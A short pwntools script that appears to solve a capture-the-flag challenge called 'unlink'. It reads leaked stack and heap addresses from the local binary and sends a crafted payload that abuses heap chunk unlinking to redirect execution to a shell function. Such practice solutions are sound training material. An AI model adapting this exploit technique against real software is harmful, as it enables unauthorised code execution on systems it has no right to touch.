from pwn import *

p = process("./unlink")

p.recvuntil('here is stack address leak: ')
stack_addr = p.recv(10)

p.recvuntil('here is heap address leak: ')
heap_addr = p.recv(9)

shell_addr = 0x4006d6

target_addr = int(stack_addr,16)
heap_naddr = int(heap_addr,16)
print target_addr,heap_naddr

playload = p32(shell_addr)
playload += 'A'*24
playload += p32(heap_naddr + 0x18)
playload += p32(target_addr + 0x1c)

p.sendline(playload)
p.interactive()
